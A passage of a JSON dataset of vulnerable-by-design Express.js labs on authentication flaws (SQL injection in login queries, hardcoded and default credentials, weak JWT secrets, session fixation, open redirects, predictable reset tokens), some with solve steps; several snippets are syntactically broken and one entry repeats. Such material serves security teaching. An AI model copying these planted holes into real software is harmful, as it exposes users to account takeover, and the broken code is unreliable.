      "labDescription": "This lab's Autnenticationsystem fails to invalidate existing sessions after password changes, allowing attackers to maintain persistent access using old credentials. To solve the lab: 1. Authenticate with Carlos's credentials (user: carlos, password: Summer2024). 2. Change Carlos's password while preserving your active session. 3. Use the original session cookie to access the /admin/export endpoint and download sensitive financial records. The system only validates sessions against initial password hashes, not current credentials.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{\n  username: 'carlos',\n  passwordHash: crypto.createHash('sha256').update('Summer2024').digest('hex'),\n  isAdmin: true\n}];\n\nconst sessions = new Map();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username);\n  \n  if (!user || user.passwordHash !== crypto.createHash('sha256').update(password).digest('hex')) {\n    return res.status(401).send('Invalid credentials');\n  }\n\n  const sessionId = crypto.randomBytes(16).toString('hex');\n  sessions.set(sessionId, {\n    username: user.username,\n    passwordHash: user.passwordHash // Storing password hash at time of login\n  });\n\n  res.cookie('session', sessionId, { httpOnly: true });\n  res.send('Logged in successfully');\n});\n\napp.post('/change-password', (req, res) => {\n  const sessionId = req.cookies.session;\n  const { newPassword } = req.body;\n  \n  if (!sessions.has(sessionId)) return res.status(401).send('Unauthorized');\n  \n  const user = users.find(u => u.username === sessions.get(sessionId).username);\n  user.passwordHash = crypto.createHash('sha256').update(newPassword).digest('hex');\n  \n  // Critical flaw: Doesn't update existing sessions' passwordHash\n  res.send('Password changed successfully');\n});\n\napp.get('/admin/export', (req, res) => {\n  const sessionId = req.cookies.session;\n  const session = sessions.get(sessionId);\n  \n  if (!session) return res.status(401).send('Unauthorized');\n  \n  const user = users.find(u => u.username === session.username);\n  \n  // Vulnerability: Only checks initial password hash, not current\n  if (session.passwordHash === user.passwordHash && user.isAdmin) {\n    res.send('ADMIN DATA: All financial records downloaded');\n  } else {\n    res.status(403).send('Admin access required');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Autnenticationbypass due to unsanitized login input",
      "labDescription": "This lab demonstrates a vulnerability where user input in the login form is concatenated directly into the SQL query, allowing injection that bypasses password verification.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'pass1')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
  },
  {
      "labScenario": "Plaintext password storage vulnerability",
      "labDescription": "This lab shows an Autnenticationsystem that stores passwords in plaintext, making it trivial for attackers to retrieve credentials if the database is compromised.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'admin123')\");\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
  },
  {
      "labScenario": "Missing password verification in login process",
      "labDescription": "This lab simulates a login endpoint where the system only checks for the existence of a username and ignores the password, allowing attackers to log in with any password.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'pass1')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  // Vulnerable: password is not verified\n  const query = SELECT * FROM users WHERE username = '${username}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "easy"
  },
  {
      "labScenario": "hardcoded credentials in source code",
      "labDescription": "This lab simulates an Autnenticationsystem that uses hardcoded credentials embedded in the source code. An attacker can easily read these values to gain access.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// hardcoded credentials\nconst ADMIN_USER = 'admin';\nconst ADMIN_PASS = 'admin123';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === ADMIN_USER && password === ADMIN_PASS) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "easy"
  },
  {
      "labScenario": "Weak session token generation with predictable algorithm",
      "labDescription": "This lab demonstrates a vulnerability where session tokens are generated using a predictable algorithm, allowing attackers to guess valid tokens and hijack sessions.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.json());\n\napp.use(session({\n  secret: 'predictableSecret',\n  resave: false,\n  saveUninitialized: true\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username && password) {\n    // Predictable token using username and current time\n    const token = crypto.createHash('md5').update(username + Date.now().toString()).digest('hex');\n    req.session.token = token;\n    res.json({ token: token });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/profile', (req, res) => {\n  if (req.session.token) res.send(Profile accessed with token ${req.session.token});\n  else res.send('Not authenticated');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Insecure JWT handling with weak secret",
      "labDescription": "This lab simulates a system that uses JSON Web Tokens for Autnenticationbut employs a weak secret and does not enforce proper verification, making it easy for attackers to forge tokens.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst SECRET = 'weaksecret';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username && password) {\n    const token = jwt.sign({ username: username }, SECRET);\n    res.json({ token: token });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const token = req.headers.authorization;\n  try {\n    const payload = jwt.verify(token, SECRET);\n    res.send(Access granted for ${payload.username});\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Session fixation vulnerability in login process",
      "labDescription": "This lab demonstrates a vulnerability where the session ID is not regenerated upon login, allowing attackers to fix a session ID and hijack the session later.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  // Vulnerable: session ID remains unchanged after login\n  res.send('Login successful');\n});\n\napp.get('/profile', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Please log in');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "Bypass of admin override due to missing access checks",
      "labDescription": "This lab simulates an admin override function that lacks proper access control. Attackers can exploit this flaw to perform administrative actions without proper authorization.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/adminOverride', (req, res) => {\n  const token = req.body.overrideToken;\n  // Vulnerable: token check is weak\n  if (token === 'override123') {\n    res.send('Admin override successful');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Autnenticationvulnerability due to predictable session IDs",
      "labDescription": "This lab shows a system that generates session IDs in a predictable manner, enabling attackers to guess and hijack sessions.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.json());\n\napp.use(session({\n  secret: 'predictableSecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Not authenticated');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Token exchange vulnerability with improper validation",
      "labDescription": "This lab simulates a token exchange endpoint that fails to properly validate tokens, allowing attackers to exchange arbitrary tokens for access tokens.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/tokenExchange', (req, res) => {\n  const token = req.body.token;\n  if (token === 'validToken') {\n    res.json({ newToken: 'newToken123' });\n  } else {\n    res.json({ newToken: token });\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "Default credentials vulnerability in system configuration",
      "labDescription": "This lab simulates an Autnenticationsystem using default credentials that have not been changed from the initial configuration, making it trivial to log in.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst DEFAULT_USER = 'defaultUser';\nconst DEFAULT_PASS = 'defaultPass';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === DEFAULT_USER && password === DEFAULT_PASS) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "easy"
  },
  {
      "labScenario": "Misconfigured OAuth callback vulnerability",
      "labDescription": "This lab simulates an OAuth Autnenticationflow where the callback URL is taken directly from user input without validation, allowing attackers to redirect users to malicious sites.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/oauth/callback', (req, res) => {\n  const { token, callbackUrl } = req.body;\n  if (token === 'validToken') {\n    res.redirect(callbackUrl);\n  } else {\n    res.send('Invalid token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Weak two-factor Autnenticationimplementation",
      "labDescription": "This lab simulates a two-factor Autnenticationsystem where the one-time password (OTP) is not properly verified. Attackers can bypass the 2FA step by supplying any value.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/2fa', (req, res) => {\n  const { username, password, otp } = req.body;\n  // Vulnerable: OTP is not verified properly\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Insecure password reset without token validation",
      "labDescription": "This lab simulates a password reset feature where the reset token passed in the URL is not validated, allowing attackers to reset any user's password.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (email, password) VALUES ('user@example.com', 'oldpass')\");\n});\n\napp.post('/resetPassword', (req, res) => {\n  const token = req.query.token;\n  const newPass = req.body.newPassword;\n  const query = UPDATE users SET password = '${newPass}' WHERE email = '${token}';\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Password reset successful');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "hardcoded API keys for authentication",
      "labDescription": "This lab demonstrates an Autnenticationmechanism that uses hardcoded API keys, exposing them in the source code. Attackers can extract these keys and bypass authentication.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst API_KEY = 'hardcoded123';\n\napp.post('/apiAccess', (req, res) => {\n  const key = req.body.apiKey;\n  if (key === API_KEY) {\n    res.send('Access granted');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "easy"
  },
  {
      "labScenario": "Insecure cookie settings in session management",
      "labDescription": "This lab simulates a session management vulnerability where session cookies are set without secure or HttpOnly flags, making them vulnerable to theft via XSS.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.json());\n\napp.use(session({\n  secret: 'insecureSecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false, httpOnly: false }\n}));\n\napp.post('/login', (req, res) => {\n  if (req.body.username && req.body.password) {\n    req.session.user = req.body.username;\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/profile', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Not logged in');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "Weak password strength enforcement in registration",
      "labDescription": "This lab simulates a registration process that fails to enforce strong password requirements, allowing users to set easily guessable passwords.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  // Vulnerable: No password complexity check\n  if (username && password) {\n    res.send('Registration successful');\n  } else {\n    res.send('Registration failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "easy"
  },
  {
      "labScenario": "Open redirect in login flow enabling bypass",
      "labDescription": "This lab simulates a login flow where a redirect URL parameter is not validated. Attackers can manipulate this parameter to redirect users to a malicious site after authentication.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password, redirectUrl } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.redirect(redirectUrl);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "Unencrypted login over HTTP",
      "labDescription": "This lab simulates an Autnenticationsystem that transmits credentials over plain HTTP, exposing them to network sniffing and interception by attackers.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username && password) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\n// Note: This server runs over HTTP\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "CSRF vulnerability in authentication",
      "labDescription": "This lab simulates a cross-site request forgery vulnerability in the login process where an attacker can force a login action from another site without the user's consent.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Vulnerable: No CSRF protection\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Insecure password change without current password verification",
      "labDescription": "This lab simulates a password change functionality that does not require the user to input their current password. An attacker who hijacks the session can change the password without knowing the old one.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/changePassword', (req, res) => {\n  if (req.session.user) {\n    res.send('Password changed successfully');\n  } else {\n    res.send('Not authenticated');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Insecure token refresh mechanism without validation",
      "labDescription": "This lab simulates a token refresh endpoint that accepts any refresh token and returns a new access token without proper validation, allowing attackers to bypass authentication.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/refreshToken', (req, res) => {\n  const refreshToken = req.body.refreshToken;\n  if (refreshToken) {\n    res.json({ accessToken: 'newAccessToken123' });\n  } else {\n    res.status(400).send('Invalid refresh token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "Autnenticationbypass due to insufficient logging",
      "labDescription": "This lab simulates a scenario where the Autnenticationprocess lacks sufficient logging, making it easier for attackers to perform brute-force attacks undetected.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "easy"
  },
  {
      "labScenario": "Open redirect vulnerability in SSO callback",
      "labDescription": "This lab simulates an SSO Autnenticationflow where the callback URL is directly taken from user input without validation, allowing attackers to redirect users to malicious sites.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/sso/callback', (req, res) => {\n  const { token, redirectUrl } = req.body;\n  if (token === 'validToken') {\n    res.redirect(redirectUrl);\n  } else {\n    res.send('Invalid token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Autnenticationvulnerability due to hardcoded default credentials",
      "labDescription": "This lab simulates a system that uses default credentials for authentication. These default credentials are well-known and allow attackers to gain access easily.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst DEFAULT_USER = 'defaultUser';\nconst DEFAULT_PASS = 'defaultPass';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === DEFAULT_USER && password === DEFAULT_PASS) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "easy"
  },
  {
      "labScenario": "Autnenticationvulnerability in misconfigured token refresh",
      "labDescription": "This lab simulates a token refresh endpoint that fails to validate the refresh token properly, enabling attackers to obtain new access tokens using arbitrary tokens.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/refresh', (req, res) => {\n  const token = req.body.refreshToken;\n  if (token) {\n    res.json({ accessToken: 'refreshedToken123' });\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "Autnenticationbypass via insecure password change mechanism",
      "labDescription": "This lab simulates a password change feature that does not require verification of the current password, allowing attackers with an active session to change the password without knowing the old one.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/changePassword', (req, res) => {\n  if (req.session.user) {\n    res.send('Password changed successfully');\n  } else {\n    res.send('Not authenticated');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Autnenticationvulnerability due to insecure cookie attributes",
      "labDescription": "This lab simulates a system that sets session cookies without secure attributes, making them vulnerable to theft via XSS. Attackers can steal these cookies and hijack sessions.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\n\nconst app = express();\napp.use(express.json());\n\napp.use(session({\n  secret: 'insecureSecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false, httpOnly: false }\n}));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Not authenticated');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "Autnenticationbypass via insecure token exchange",
      "labDescription": "This lab simulates a token exchange endpoint that returns a new token without proper validation of the provided token, allowing attackers to forge tokens.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\napp.post('/exchange', (req, res) => {\n  const providedToken = req.body.token;\n  if (providedToken === 'validToken') {\n    res.json({ token: 'newToken123' });\n  } else {\n    res.json({ token: providedToken });\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "medium"
  },
  {
      "labScenario": "Autnenticationvulnerability in session termination on logout",
      "labDescription": "This lab simulates a logout process where the session is not properly destroyed, allowing attackers to reuse the session ID after logout.",
      "vulnerabilityName": "Authentication",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\napp.post('/logout', (req, res) => {\n  // Vulnerable: session is not destroyed\n  res.send('Logged out');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(Welcome, ${req.session.user});\n  else res.send('Please log in');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "labLevel": "hard"
  },
  {
      "labScenario": "Weak Hash-Based AutnenticationTokens",
      "labDescription": "This lab uses weak hash-based Autnenticationtokens generated with a static salt and MD5 hashing. The token format is MD5(username + 'secret123'). Attackers can compute valid tokens for other users if they know the salt. To solve the lab, compute the Autnenticationtoken for the 'admin' user and access their profile.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const crypto = require('crypto'); const app = express(); const users = [{ username: 'user', password: 'password123' }, { username: 'admin', password: 'admin456' }]; const SALT = 'secret123'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = crypto.createHash('md5').update(user.username + SALT).digest('hex'); res.cookie('authToken', token); res.send('Welcome, ' + username); }); app.get('/profile', (req, res) => { const authToken = req.cookies.authToken; const user = users.find(u => crypto.createHash('md5').update(u.username + SALT).digest('hex') === authToken); if (!user) return res.status(401).send('Unauthorized'); res.send('Profile for ' + user.username); }); const PORT = 4000; app.listen(PORT, () => console.log('Weak Token Generation Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Bypass Session Termination via Stale Password Hash Validation",
      "labDescription": "This lab's Autnenticationsystem fails to invalidate existing sessions after password changes, allowing attackers to maintain persistent access using old credentials. To solve the lab: 1. Authenticate with Carlos's credentials (user: carlos, password: Summer2024). 2. Change Carlos's password while preserving your active session. 3. Use the original session cookie to access the /admin/export endpoint and download sensitive financial records. The system only validates sessions against initial password hashes, not current credentials.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{\n  username: 'carlos',\n  passwordHash: crypto.createHash('sha256').update('Summer2024').digest('hex'),\n  isAdmin: true\n}];\n\nconst sessions = new Map();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username);\n  \n  if (!user || user.passwordHash !== crypto.createHash('sha256').update(password).digest('hex')) {\n    return res.status(401).send('Invalid credentials');\n  }\n\n  const sessionId = crypto.randomBytes(16).toString('hex');\n  sessions.set(sessionId, {\n    username: user.username,\n    passwordHash: user.passwordHash // Storing password hash at time of login\n  });\n\n  res.cookie('session', sessionId, { httpOnly: true });\n  res.send('Logged in successfully');\n});\n\napp.post('/change-password', (req, res) => {\n  const sessionId = req.cookies.session;\n  const { newPassword } = req.body;\n  \n  if (!sessions.has(sessionId)) return res.status(401).send('Unauthorized');\n  \n  const user = users.find(u => u.username === sessions.get(sessionId).username);\n  user.passwordHash = crypto.createHash('sha256').update(newPassword).digest('hex');\n  \n  // Critical flaw: Doesn't update existing sessions' passwordHash\n  res.send('Password changed successfully');\n});\n\napp.get('/admin/export', (req, res) => {\n  const sessionId = req.cookies.session;\n  const session = sessions.get(sessionId);\n  \n  if (!session) return res.status(401).send('Unauthorized');\n  \n  const user = users.find(u => u.username === session.username);\n  \n  // Vulnerability: Only checks initial password hash, not current\n  if (session.passwordHash === user.passwordHash && user.isAdmin) {\n    res.send('ADMIN DATA: All financial records downloaded');\n  } else {\n    res.status(403).send('Admin access required');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Exploit a weak password reset mechanism to access the admin account.",
      "labDescription": "The application features a password reset mechanism that generates a reset token identical to the username. This design flaw allows an attacker to reset any user's password simply by knowing their username and using it as the token. In this lab, there is an admin user with the username 'admin'. To solve the lab, follow these steps: 1. Request a password reset for the user 'attacker'. 2. Observe the reset link provided (e.g., '/reset?token=attacker'). 3. Modify the token in the URL to 'admin' (e.g., '/reset?token=admin'). 4. Reset the admin's password to a new value of your choice. 5. Log in as 'admin' using the new password to gain access. This lab demonstrates how predictable tokens can lead to unauthorized access, emphasizing the importance of secure token generation in Autnenticationsystems.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nlet users = { 'attacker': 'attackerpass', 'admin': 'adminpass' };\n\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/forgot', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><button type=\"submit\">Request reset</button></form>');\n});\n\napp.post('/forgot', (req, res) => {\n  const { username } = req.body;\n  if (users[username]) {\n    const resetLink = `/reset?token=${username}`;\n    res.send(`Reset link: <a href=\"${resetLink}\">${resetLink}</a>`);\n  } else {\n    res.status(404).send('User not found');\n  }\n});\n\napp.get('/reset', (req, res) => {\n  const { token } = req.query;\n  if (!token || !users[token]) {\n    res.status(400).send('Invalid token');\n  } else {\n    res.send(`<form method=\"post\"><input name=\"token\" type=\"hidden\" value=\"${token}\"><input name=\"new_password\" type=\"password\" placeholder=\"New Password\"><button type=\"submit\">Reset password</button></form>`);\n  }\n});\n\napp.post('/reset', (req, res) => 